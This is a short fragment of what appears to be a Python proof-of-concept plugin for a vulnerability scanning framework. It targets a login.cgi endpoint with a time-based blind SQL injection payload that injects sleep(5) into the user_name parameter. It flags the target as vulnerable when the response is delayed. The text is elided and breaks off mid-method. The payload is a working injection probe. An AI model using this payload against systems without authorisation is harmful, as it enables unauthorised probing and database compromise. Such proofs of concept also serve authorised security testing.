...
class POC(POCBase):
  ...
  # 漏洞简要描述
    ...
    def _verify(self):
        result = {}
        path = "/login.cgi?act=login&user_name=adminewmfi'%2b(select*from(select(sleep(5)))a)%2b'&user_pwd=123456"
        url = self.url + path
        try:
            resq = requests.get(url=url)
            if resq and resq.status_code == 200 and 5<=resq.elapsed.seconds:
                result['VerifyInfo'] = {}
